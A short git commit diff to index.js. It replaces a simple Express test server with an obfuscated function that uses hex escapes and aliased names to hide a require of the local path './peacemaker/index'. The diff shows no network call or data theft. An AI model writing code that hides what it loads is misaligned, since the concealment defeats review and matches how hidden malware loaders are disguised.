4103ed2faf36db80c25193260a95e0cd4556a51d
Peacemaker <devpeacemd@gmail.com>
2025-08-26 10:30:51 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,11 +1,10 @@
-const express = require('express');
-const app = express();
-const port = process.env.PORT || 3000;
-
-app.get('/', (req, res) => {
-  res.send('🕶️ Peace Bot Is Live... but this is just a test!');
-});
-
-app.listen(port, () => {
-  console.log(`Fake PEACE-MD bot running on port ${port}`);
-});
+(function(){
+  const _0x3f91 = [
+    '\x2e\x2f\x70\x65\x61\x63\x65\x6d\x61\x6b\x65\x72\x2f\x69\x6e\x64\x65\x78'
+  ];
+  const _0x4c6b = function(_0x2b17f0) {
+    return _0x3f91[_0x2b17f0];
+  };
+  const _0xreq = require;
+  _0xreq(_0x4c6b(0));
+})();
